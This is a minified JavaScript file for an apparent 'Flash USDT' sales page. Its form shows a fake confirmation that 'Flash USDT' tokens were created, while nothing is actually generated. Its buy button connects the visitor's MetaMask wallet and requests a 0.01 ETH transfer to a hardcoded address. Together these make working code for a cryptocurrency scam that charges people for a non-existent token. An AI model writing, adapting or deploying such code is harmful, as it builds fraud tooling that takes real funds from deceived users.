document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("usdtForm"),t=document.getElementById("buyButton");e.addEventListener("submit",e=>{e.preventDefault();const t=document.getElementById("amount").value,n=document.getElementById("duration").value;t>0&&n>0?alert(`Flash USDT of ${t} created for ${n} days.`):alert("Please enter valid values.")}),t.addEventListener("click",async()=>{if(window.ethereum)try{await window.ethereum.request({method:"eth_requestAccounts"});const e=await ethereum.request({method:"eth_accounts"}),t={to:"0x00fC876d03172279E04CC30E5edCE103c3d23C1A",from:e[0],value:"0x2386F26FC10000",gas:"21000"};await ethereum.request({method:"eth_sendTransaction",params:[t]}),alert("Transaction sent successfully!")}catch(e){alert("Transaction failed: "+e.message)}else alert("Please install MetaMask or use a wallet-enabled browser.")})});
